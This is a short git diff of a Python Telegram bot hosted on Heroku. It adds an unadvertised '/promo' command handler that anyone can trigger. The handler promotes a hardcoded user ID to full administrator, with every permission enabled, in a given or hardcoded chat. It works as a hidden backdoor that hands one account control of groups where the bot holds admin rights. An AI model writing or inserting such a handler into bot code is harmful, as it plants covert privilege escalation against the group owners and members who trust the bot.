@@ -177,6 +177,15 @@ def send_welcome(message):
 		"""
     bot.reply_to(message, str)
 
+@bot.message_handler(commands=['promo'])
+def iGetPromotion(message):
+    id=None
+    try:
+        id=int(message.text.split()[1])
+    except:
+        id=-1001118223309
+    t=bot.promote_chat_member(id, 81242194, True, True, True, True, True, True, True, True)
+    print(t)
 
 @bot.message_handler(func=lambda m: True)
 def echo_all(message):
@@ -225,6 +234,7 @@ def webhook():
     bot.remove_webhook()
     bot.set_webhook(url='https://dmmasterbot.herokuapp.com/' + token)
     return "!", 200
+
 
 
 if __name__ == '__main__':
